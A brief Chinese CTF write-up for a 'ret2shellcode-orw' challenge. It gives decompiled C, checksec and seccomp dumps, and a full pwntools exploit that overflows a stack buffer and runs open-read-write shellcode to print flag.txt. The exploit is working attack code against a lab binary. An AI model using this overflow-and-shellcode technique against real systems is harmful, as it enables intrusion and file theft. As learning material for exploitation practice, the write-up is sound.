# ret2shellcode-orw

反编译：

```c
ssize_t vuln()
{
  __int64 v0; // rdx
  __int64 v1; // rcx
  __int64 v2; // r8
  __int64 v3; // r9
  _BYTE buf[256]; // [rsp+0h] [rbp-100h] BYREF

  puts("No /bin/sh for you this time!");
  printf("Here is your gift: %p\n", buf);
  printf("Show me your shellcode: ");
  sandbox((__int64)"Show me your shellcode: ", (__int64)buf, v0, v1, v2, v3);
  return read(0, buf, 0x200u);
}
```

checksec 输出：

```
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX unknown - GNU_STACK missing
PIE:        No PIE (0x400000)
Stack:      Executable
RWX:        Has RWX segments
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

seccomp-tools dump 输出：

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0006
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0006: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x06 0x00 0x00 0x00000000  return KILL
```

和 [ret2shellcode](./ret2shellcode.md) 类似，在栈上写 shellcode，不过这次限制了能用的 syscall，因此用 pwntools 的 shellcraft.amd64.linux.cat2 来完成 open-read-write：

```python
from pwn import *

context(log_level="DEBUG")
context.terminal = ["tmux", "split-w", "-h"]
context.arch = "amd64"

if args.REMOTE:
    p = remote(args.HOST, args.PORT)
else:
    p = process("./vuln")
elf = ELF("./vuln")

p.recvuntil(b"Here is your gift:")
buf_addr = int(p.recvline().decode(), 16)
log.info(f"buf addr: 0x{buf_addr:x}")
shellcode = shellcraft.amd64.linux.cat2("flag.txt", fd=1)
shellcode_addr = buf_addr + 0x110
payload = b"A" * 0x108 + p64(shellcode_addr) + asm(shellcode)
print(shellcode)
print(payload)
p.recvuntil(b"shellcode: ")
p.send(payload)
p.interactive()
```
